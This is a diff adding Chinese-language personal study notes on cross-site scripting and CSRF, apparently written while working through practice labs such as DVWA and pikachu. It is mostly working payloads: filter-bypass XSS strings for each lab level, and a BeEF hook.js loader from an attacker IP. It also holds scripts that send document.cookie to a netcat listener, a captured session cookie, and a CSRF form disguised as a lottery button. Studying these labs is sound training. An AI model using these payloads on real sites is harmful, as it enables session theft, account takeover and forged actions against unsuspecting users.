@@ -1,0 +1,395 @@
+xss
+跨站攻击
+
+测试xss
+成功就弹窗
+<script>alert('1')</script>
+
+xss1.njhack.xyz/#/
+
+xss
+跨站攻击
+
+前端发生的攻击
+javascript
+
+安全人员测试xss
+如果测试成功，就是让它弹窗
+<script>alert('1')</script>
+
+kali使用beef，beef=xss攻击平台
+cd /usr/share/beef-xss
+./beef
+
+ui/panel操作窗口
+hook.js是测试xss漏洞成功之后的攻击代码
+
+<script src="http://[黑客ip]:3000/hook.js"></script>
+
+xss靶场
+xss1.njhack.xyz
+
+dvwa靶场
+admin
+password
+
+但凡出现互动的地方，都可能出现漏洞！！！！！
+
+<pre>Hello <script>alert('1')</script></pre>
+script标签是js语言执行用的，当js正确执行的时候，不会出现东西，js会被浏览器执行！！！！
+
+<scr<script>ipt>alert('1')</script>
+
+点住我！<img src="x" onmouseup=alert(1) />
+
+------------------
+
+0x00
+<script>alert(1)</script>(窗口弹出)
+
+0x01
+</textarea><script>alert(1)</script><textarea>
+
+0x02
+<input type="name" value="fdfdfdfd "><script>alert(1)</script><img      ">
+
+0x03
+function render ("haha") {
+  const stripBracketsRe = /[()]/g
+  input = "haha".replace(stripBracketsRe, '')
+  return input
+}
+
+屏蔽括号，考虑使用`
+<script>alert`1`</script>
+
+0x04
+屏蔽() `
+
+实体编码字符<svg>
+svg标签会翻译后面的unicode字符
+<svg><script>alert&#40;1&#41;</script>
+
+0x05
+<!-- -->
+<!-- --!>
+
+以上两个都可以当前端的注释符
+
+
+--!><script>alert(1)</script>
+
+
+0x06
+
+js中语法松散
+<\br>换行符
+function render (input) {
+  input = input.replace(/auto|on.*=|>/ig, '_')
+  return `<input value=1 ${input} type="text">`
+}
+auto或者on开头，后面跟任何东西，直到出现=或者>，如果匹配，整条线都转化为_
+
+js中语法松散
+
+onmouseover
+="alert(1)"
+
+0x07
+function render (input) {
+  const stripTagsRe = /<\/?[^>]+>/gi
+
+  input = input.replace(stripTagsRe, '')
+  return `<article>${input}</article>`
+}
+所有的标签类，只让写左标签，右标签一写上去就没了
+
+<img src="" onerror="alert(1)"
+
+
+0x08
+
+</style
+><script>alert(1)</script>
+
+0x09
+
+function render (input) {
+  let domainRe = /^https?:\/\/www\.segmentfault\.com/
+  if (domainRe.test(input)) {
+    return `<script src="${input}"></script>`
+  }
+  return 'Invalid URL'
+}
+
+http://www.segmentfault.com" onload="alert(1)
+
+http://www.segmentfault.com"></script><img src="" onerror="alert(1)
+
+0x0A
+function render (input) {
+  function escapeHtml(s) {
+    return s.replace(/&/g, '&amp;')
+            .replace(/'/g, '&#39;')
+            .replace(/"/g, '&quot;')
+            .replace(/</g, '&lt;')
+            .replace(/>/g, '&gt;')
+            .replace(/\//g, '&#x2f')
+  }
+
+  const domainRe = /^https?:\/\/www\.segmentfault\.com/
+  if (domainRe.test(input)) {
+    return `<script src="${escapeHtml(input)}"></script>`
+  }
+  return 'Invalid URL'
+}
+
+加上了@之后，也会同时加载后面的网站
+http://www.segmentfault.com@http://sqlilabs.njhack.xyz/A.js
+
+0x0B
+function render (input) {
+  input = input.toUpperCase()
+  return `<h1>${input}</h1>`
+}
+自动把输入的内容转为大写
+js标签，src地址，随便，但是js语法是大小写敏感的！！！！
+域名加载无所谓大小写
+<script src="http://sqlilabs.njhack.xyz/A.JS"></script>
+
+0x0C
+function render (input) {
+  input = input.replace(/script/ig, '')
+  input = input.toUpperCase()
+  return '<h1>' + input + '</h1>'
+}
+
+<scrscriptipt src="http://sqlilabs.njhack.xyz/A.JS"></scrscriptipt>
+
+
+0x0D
+function render (input) {
+  input = input.replace(/[</"']/g, '')
+  return `
+    <script>
+          // alert('${input}')
+    </script>
+  `
+}
+过滤< " ' /
+
+xx
+alert(1)
+-->
+
+0x0e
+function render (input) {
+  input = input.replace(/<([a-zA-Z])/g, '<_$1')
+  input = input.toUpperCase()
+  return '<h1>' + input + '</h1>'
+}
+
+<ſcript src="http://sqlilabs.njhack.xyz/A.JS"></script>
+
+0x0f
+
+<img src onerror="console.error('')">
+
+');alert(1)//
+
+<img src onerror="console.error('');alert(1)//')">
+
+0x10
+2
+alert(1)
+
+2;alert(1)
+
+0x11
+");alert(1);//
+
+0x12
+\");alert(1);//
+
+1
+<script>alert(1)</script>
+
+2
+<input name=keyword  value="haha123   "><script>alert(1)</script>//   ">
+
+3
+<input name=keyword  value='haha123   ' onclick='alert(1)    '>
+单引号闭合
+
+4
+<input name=keyword  value="haha123   " onclick="alert(1)        ">
+双引号闭合
+
+
+5
+<a href="http://www.baidu.com">click me</a>
+<input name=keyword  value="haha123  "><a href=javascript:alert(1)><"   ">
+
+6
+"><a hREf=javascript:alert(1)><"
+
+7
+<input name=keyword  value="haha123 "><scrscriptipt>alert(1)</scrscriptipt><"   ">
+<scrscriptipt>alert(1)</scrscriptipt>
+屏蔽script时进行嵌套
+
+8
+unicode编码在前端会进行解析为正常的字符串
+
+javascript:alert(1)
+&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;
+
+href="这里面的任何字符串，都会被当作协议来执行"
+
+9
+一定要包含http:// 可将其置于执行代码的后端
+&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;//http://
+javascript:alert(1)//http://
+
+10
+DOM型xss
+<input name="t_sort"  value=" " type="text" onclick="alert(1)  " type="hidden">
+
+haha123&t_sort=" type="text" onclick="alert(1)
+
+11
+Referer: 3&t_sort=" type="text" onclick="alert(1)
+
+16
+<svg%0aonload=alert(1)>
+
+<svg onload=alert(1)>
+
+<input type='text' name='words' id='words' value='123 '/><img ' class='form-control' placeholder='' /> 
+
+----
+'/><img
+被防火墙拦截
+----
+
+'/><img 一次编码
+防火墙判断
+交给一个程序判断 一次解码
+search-index-123'/><img-1.html 当作一个文件来访问
+访问不到，404
+
+----
+
+'/><img 二次编码
+防火墙判断
+交给一个程序判断 一次解码
+search-index-[一次编码的内容]-1.html 进行搜索
+防火墙进行解码，判断是否有img script ....，有就替换为空
+搜索结果
+
+----
+
+<input type='text' name='words' id='words' value=' 123 ' onmouseover='alert(1) '/>
+
+123' onmouseover='alert(1)
+编码两次
+
+
+=========================
+
+<script/haha>
+  alert(1)
+</script>
+
+<script
+>
+  alert(1)
+</script>
+
+<scr\x00ipt>
+  alert(1)
+</scr\x00ipt>
+
+<i[%00]mg onerror="alert(1)" src="" />
+
+<img/onerror=alert(1) src="" />
+
+-------------------
+
+如果某天不能用外网，也不能用kali
+
+存储型xss最重要的是获取用户的cookie！！！！！！！！！！
+
+nc -lvp 4444 使用nc监听4444端口
+
+<script>var img = document.createElement("img");img.src="http://127.0.0.1:4444/a?"+escape(document.cookie);</script>
+
+<script>
+document.write('<img src="http://127.0.0.1:4444/?'+document.cookie+'"/> ');
+</script>
+
+document.cookie
+获取用户所在网站的cookie
+
+用户访问后，可以在nc上看到
+BEEFHOOK=AREs541oCaZqmaEhmEu8FKmaX7baBAFUMp2ZapHkFhcDuYwsDfAhSSCcBQYdTN3mCMUrBdZdG7dgWZ0H;%20PHPSESSID=pp6ei8ut8gkmntp2t4dv7vo026;%20security=low
+
+======================================
+xss
+
+1-3
+<script>alert(1)</script>
+
+4-5
+注意看源代码中js刚开始就是'闭合
+javascript:alert(1) 
+#' onclick='alert(1)
+
+6
+nc -lvp 4444
+
+<script>var img=document.createElement("img");img.src="http://127.0.0.1:4444/a?"+escape(document.cookie);</script>
+
+7
+<sCript>alert(1)</sCript>
+<img src=x onerror=alert(1)>
+
+8
+htmlspecialchars
+把字符转化为html实体（需要svg翻译的东西）
+#' onclick='alert(1)
+
+9
+javascript:alert(1) 
+
+10
+';alert(1);//
+';</script><script>alert(1)//
+
+
+
+csrf
+跨站请求伪造
+欺骗用户进行点击，一旦用户点击了，攻击完成
+
+csrf和xss
+csrf是欺骗用户，借助用户权限攻击，但是没有拿到用户权限
+xss是直接获取cookie，拿到用户权限
+
+get类型，诱导用户点击
+http://pikachu.com/vul/csrf/csrfget/csrf_get_edit.php?sex=girl&phonenum=9999&add=usa&email=lili%40pikachu.com&submit=submit
+
+post类型
+http://pikachu.com/vul/csrf/csrfpost/csrf_post_edit.php
+
+sex=girl&phonenum=123&add=usa&email=lili%40pikachu.com&submit=submit
+
+<form method="POST" action="http://pikachu.com/vul/csrf/csrfpost/csrf_post_edit.php">
+<input type="hidden" name="sex" value="boy"/>
+<input type="hidden" name="phonenum" value="9999"/>
+<input type="hidden" name="add" value="usa"/>
+<input type="hidden" name="email" value="lili%40pikachu.com"/>
+<input type="submit" name="submit" value="点我抽奖">
+</form>
+
+csrf漏洞主要用来欺骗用户点击，如果使用token可以防御csrf
